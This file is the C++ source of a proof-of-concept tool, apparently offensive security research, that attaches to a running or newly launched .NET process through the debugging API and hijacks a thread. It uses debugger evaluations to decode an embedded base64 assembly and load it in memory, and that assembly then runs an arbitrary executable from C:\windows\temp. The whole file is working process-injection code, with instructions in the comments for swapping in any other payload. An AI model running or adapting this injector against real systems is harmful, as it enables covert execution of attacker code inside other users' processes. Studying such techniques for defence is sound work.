#include "Common.h"
#include "ManagedHandler.h"
#include "Debugger.h"
#include "DebuggerHelper.h"
#include "ManagedHandler.h"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "CorGuids.lib")

// Base64 encoded simple .NET Assembly which will load a .NET EXE from C:\windows\temp\inject.exe and execute its entrypoint:
// namespace Injected {
//  class Injected {
//	  public static void ThreadEntry()
//	  {
//		var asm = Assembly.LoadFile(@"C:\windows\temp\inject.exe");
//		asm.EntryPoint.Invoke(null, new object[]{ new string[] { } });
//	  }
//
//	  public static void Entry()
//	  {
//		Console.WriteLine("@_xpn_ .NET debugging POC");
//		var thread = new System.Threading.Thread(new ThreadStart(ThreadEntry));
//		thread.Start();
//	  }
//   }
// }
// 
// To swap this for something else, create new .NET assembly named "injected" and expose a static method of Injected.Injected.Entry(), eg:
// namespace Injected {
//   class Injected {
//     public static void Entry() {
//
//     }
//   }
// }
// Compile for "Any CPU" and Base64 encode :)

#define BASE64_ENCODED_ASSEMBLY L"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAKn5sfwAAAAAAAAAAOAAIiALATAAAAoAAAAGAAAAAAAASikAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAPcoAABPAAAAAEAAAHADAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAABoKAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAUAkAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAHADAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAArKQAAAAAAAEgAAAACAAUA0CAAAJgHAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBgApAAAAAQAAEQByAQAAcCgPAAAKCgZvEAAAChQXjRAAAAElFhaNFAAAAaJvEQAACiYqNgByNwAAcCgSAAAKACoAEzACACYAAAACAAARAHK6AABwKBIAAAoAFP4GAQAABnMTAAAKcxQAAAoKBm8VAAAKACoiAigWAAAKACoAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAALAIAACN+AACYAgAAzAIAACNTdHJpbmdzAAAAAGQFAADwAAAAI1VTAFQGAAAQAAAAI0dVSUQAAABkBgAANAEAACNCbG9iAAAAAAAAAAIAAAFHFAIACQAAAAD6ATMAFgAAAQAAABcAAAACAAAABAAAABYAAAAOAAAAAgAAAAEAAAABAAAAAAD6AQEAAAAAAAYAPQFjAgYAqgFjAgYAcQAxAg8AgwIAAAYAmQAOAgYAIAEOAgYAAQEOAgYAkQEOAgYAXQEOAgYAdgEOAgYAsAAOAgYAhQBEAgYAYwBEAgYA5AAOAgYAywDZAQYAkgIHAgYAtAIOAgYAEwDIAQYAIAIOAgYA8wEHAgYAWAAOAgYARgAHAgYAqALIAQAAAAABAAAAAAABAAEAAAAQABoAGgBBAAEAAQBQIAAAAACWAL0CUAABAIUgAAAAAJYALABQAAEAlCAAAAAAlgDDAlAAAQDGIAAAAACGGCsCBgABAAkAKwIBABEAKwIGABkAKwIKACkAKwIQADEAKwIQADkAKwIQAEEAKwIQAEkAKwIQAFEAKwIQAFkAKwIQAGEAKwIVAGkAKwIQAHEAKwIQAHkAKwIQAIkAPQAfAIkAmQIlAKkANgAqALEATgAxALkAKwI7AJEAKwJBAJEArgIGAIEAKwIGAC4ACwBUAC4AEwBdAC4AGwB8AC4AIwCFAC4AKwCRAC4AMwCRAC4AOwCRAC4AQwCFAC4ASwCXAC4AUwCRAC4AWwCRAC4AYwCvAC4AawDZAC4AcwDmABoANgAEgAAAAQAAAAAAAAAAAAAAAAAjAAAABAAAAAAAAAAAAAAARwAKAAAAAAAAAAA8TW9kdWxlPgBtc2NvcmxpYgBUaHJlYWQASW5qZWN0ZWQAaW5qZWN0ZWQAUmV2ZXJzZU1lAEludm9rZQBMb2FkRmlsZQBDb25zb2xlAFdyaXRlTGluZQBNZXRob2RCYXNlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5UaHJlYWRpbmcAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBTdHJpbmcAaW5qZWN0ZWQuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBNZXRob2RJbmZvAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBPYmplY3QAZ2V0X0VudHJ5UG9pbnQAVGhyZWFkU3RhcnQAQXNzZW1ibHkAVGhyZWFkRW50cnkAAAAAADVDADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAGkAbgBqAGUAYwB0AC4AZQB4AGUAAICBSQB0ACAAcwBlAGUAbQBzACAAeQBvAHUAIABhAHIAZQAgAGQAaQBzAGEAcwBzAGUAbQBiAGwAaQBuAGcAIABtAGUALgAuAC4AIABnAG8AbwBkAC4ALgAuACAAcwBvACAAeQBvAHUAIABzAGgAbwB1AGwAZAAgAGIAZQAgADsAKQAAM0AAXwB4AHAAbgBfACAALgBOAEUAVAAgAGQAZQBiAHUAZwBnAGkAbgBnACAAUABPAEMAAAAAjm52Metliku6k+4hgwtFiQAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBAcBEkUFAAESRQ4EIAASTQYgAhwcHRwEAAEBDgQHARJJBSACARwYBSABARJdCLd6XFYZNOCJAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAALAQAGaW5qZWN0AAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDIwAAApAQAkMDJkYzZjY2UtMTUxMC00MjYwLWEyYmItMmU3ZmRlYjEwZWEzAAAMAQAHMS4wLjAuMAAATQEAHC5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC43LjIBAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lFC5ORVQgRnJhbWV3b3JrIDQuNy4yAAAAALMdTLUAAAAAAgAAAFcAAACgKAAAoAoAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTiE3UNqVghEOgSut0Zc43eQEAAABDOlxVc2Vyc1x4cG5cc291cmNlXHJlcG9zXGluamVjdFxpbmplY3Rcb2JqXERlYnVnXGluamVjdGVkLnBkYgAfKQAAAAAAAAAAAAA5KQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKykAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAABQDAAAAAAAAAAAAABQDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAR0AgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAABQAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAANgAHAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGkAbgBqAGUAYwB0AAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA6AA0AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAGkAbgBqAGUAYwB0AGUAZAAuAGQAbABsAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAyADAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEIADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABpAG4AagBlAGMAdABlAGQALgBkAGwAbAAAAAAALgAHAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABpAG4AagBlAGMAdAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAATDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

Debugger *dbg = NULL;
bool gStop = false;

void printIntro() {
	std::cout << "DotNetDebug by @_xpn_\n    A simple POC for exploring the power of the .NET debugger" << std::endl;
}

void printUsage(const char* const* argv) {
		std::cout << "Usage: " << argv[0] << "attach somedotnetapp.exe" << std::endl;
		std::cout << "Usage: " << argv[0] << "attachpid PID" << std::endl;
		std::cout << "Usage: " << argv[0] << "launch C:\\somedotnetapp.exe" << std::endl;
}

int main(int argc, char **argv)
{
	std::vector<ICorDebugAppDomain *> *appDomains = NULL;
	std::vector<ICorDebugAssembly *> *assemblies = NULL;
	std::vector<ICorDebugThread *> *threads = NULL;
	std::vector<std::pair<DWORD, std::wstring>> *processes = NULL;
	DWORD pid = 0;
	HRESULT hr = 0;
	ICorDebugProcess *process = NULL;
	ICorDebugStepper *step;

	printIntro();

	if (argc < 2)
	{
		printUsage(argv);
		return 1;
	}

	auto createStepperCallback = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *thread) -> bool {
		ICorDebugStepper *stepper;
		if (gStop)
		{
			std::cout << "[!] Not attaching stepper to the new thread" << std::endl;
			return true;
		}
		std::cout << "[*] New thread created, adding a stepper" << std::endl;

		thread->CreateStepper(&stepper);
		stepper->Step(0);
		return false;
	};

	auto stepCompleteCallback = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugStepper *pStepper, auto reason) -> bool {
		ICorDebugEval *eval;
		HRESULT hr;

		if (pThread->CreateEval(&eval) != S_OK)
		{
			pStepper->Step(0);
			return false;
		}

		if ((hr = eval->NewString(BASE64_ENCODED_ASSEMBLY)) != S_OK)
		{
			pStepper->Step(0);
			return false;
		}

		std::cout << "[*] Managed to eval string, looks like we have a thread to use.. w00000t :)" << std::endl;

		// Get our threadID
		// DWORD threadID;
		// pThread->GetID(&threadID);

		// std::cout << "[*] ThreadId " << threadID << std::endl;
		gStop = true;

		pStepper->Deactivate();

		std::cout << "[*] All threads except our controlled thread are now suspended :D" << std::endl;

		return true;
	};

	auto evalCompleteCallback1 = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval) -> bool {
		ICorDebugValue *value;
		ICorDebugFunction *function;

		if (pEval->GetResult(&value) != S_OK)
		{
			return false;
		}

		if (Debugger::FindMethod(&function, pAppDomain, L"mscorlib.dll", L"System.Convert", L"FromBase64String", 0) != S_OK)
		{
			std::cout << "[!] Fatal: Could not find method System.Convert.FromBase64String in mscorlib.dll" << std::endl;
			exit(2);
		}

		pEval->CallFunction(function, 1, &value);

		return true;
	};

	auto evalCompleteCallback2 = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval) -> bool {
		ICorDebugValue *value;
		ICorDebugFunction *function;

		if (pEval->GetResult(&value) != S_OK)
		{
			return false;
		}

		if (Debugger::FindMethod(&function, pAppDomain, L"mscorlib.dll", L"System.Reflection.Assembly", L"Load", 7) != S_OK)
		{
			std::cout << "[!] Fatal: Could not find method System.Reflection.Assembly.LoadFrom in mscorlib.dll" << std::endl;
			exit(2);
		}

		std::cout << "[*] Calling Assembly.LoadFile" << std::endl;
		pEval->CallFunction(function, 1, &value);

		return true;
	};

	auto evalCompleteCallback3 = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval) -> bool {
		ICorDebugValue *value;
		ICorDebugFunction *function;

		if (pEval->GetResult(&value) != S_OK)
		{
			return false;
		}

		if (Debugger::FindMethod(&function, pAppDomain, L"injected", L"Injected.Injected", L"Entry", 0) != S_OK)
		{
			std::cout << "[!] Fatal: Could not find method Injected.Injected.Entry in assembly module 'injected'" << std::endl;
			exit(3);
		}

		std::cout << "[*] Calling our loaded method" << std::endl;
		pEval->CallFunction(function, 0, NULL);

		return true;
	};

	auto evalCompleteCallback4 = [](auto *pAppDomain, auto *pThread, auto *pEval) -> bool {
		std::cout << "[*] Method call completed, detaching..." << std::endl;

		dbg->Detach();

		return true;
	};

	ManagedCallback* callback = new ManagedCallback();

	// Queue up our callbacks to handle events as they occur
	callback->SubscribeCreateThread(createStepperCallback);
	callback->SubscribeStepComplete(stepCompleteCallback);
	callback->SubscribeEvalComplete(evalCompleteCallback1);
	callback->SubscribeEvalComplete(evalCompleteCallback2);
	callback->SubscribeEvalComplete(evalCompleteCallback3);
	callback->SubscribeEvalComplete(evalCompleteCallback4);

	dbg = new Debugger(callback);
	dbg->Init();

	if (std::string(argv[1]).compare("attach") == 0)
	{
		DebuggerHelper::GetProcessList(&processes);

		for (auto p : *processes)
		{
			if (p.second.compare(DebuggerHelper::StringToWString(argv[2])) == 0)
			{
				pid = p.first;
			}
		}

		if (pid == 0)
		{
			std::cout << "[!] Could not find process: " << argv[2] << std::endl;
			return 3;
		}

		std::cout << "[*] Attaching to PID: " << pid << std::endl;

		if ((hr = dbg->Attach(pid)) != S_OK)
		{
			std::cout << "[!] Error attaching to process - HR: " << hr << std::endl;
			return 3;
		}
	}
	else if (std::string(argv[1]).compare("attachpid") == 0)
	{
		if ((hr = dbg->Attach(atoi(argv[2]))) != S_OK)
		{
			std::cout << "[!] Error attaching to process - HR: " << hr << std::endl;
			return 3;
		}
	}
	else if (std::string(argv[1]).compare("launch") == 0)
	{
		std::cout << "[*] Launching process " << argv[2] << std::endl;

		std::wstring output;
		output = DebuggerHelper::StringToWString(argv[2]);

		dbg->Run(output);
	}
	else
	{
		std::cout << "[!] Error: Unknown debug mode passed, should be attach, attachpid or launch" << std::endl;
		return 2;
	}

	std::cout << "[*] Stopping execution of target" << std::endl;
	dbg->Stop();

	std::cout << "[*] Adding steppers to current threads..." << std::endl;
	if (dbg->GetProcess(&process) == S_OK)
	{
		Debugger::GetThreads(&threads, process);
		for (auto thread : *threads) {
			dbg->CreateStepper(&step, thread);
			step->Step(0);
		}
	}

	std::cout << "[*] Continuing execution of target" << std::endl;
	dbg->Continue();
	dbg->Join();
}